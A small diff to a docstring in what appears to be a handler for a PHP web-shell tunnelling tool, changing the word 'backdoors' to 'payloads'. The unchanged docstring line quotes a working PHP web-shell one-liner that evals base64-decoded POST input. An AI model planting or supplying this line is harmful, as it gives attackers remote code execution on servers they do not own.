@@ -19,7 +19,7 @@
 #        along with this program.  If not, see <http://www.gnu.org/licenses/>.
 
 """Backwards compatible tunnel handler for
-Omega v1.0 backdoors, aka:
+Omega v1.0 payloads, aka:
     <?php eval(base64_decode($_POST[%%PASSKEY%%])); ?>
 """
 __all__ = ["Request_V1_x"]
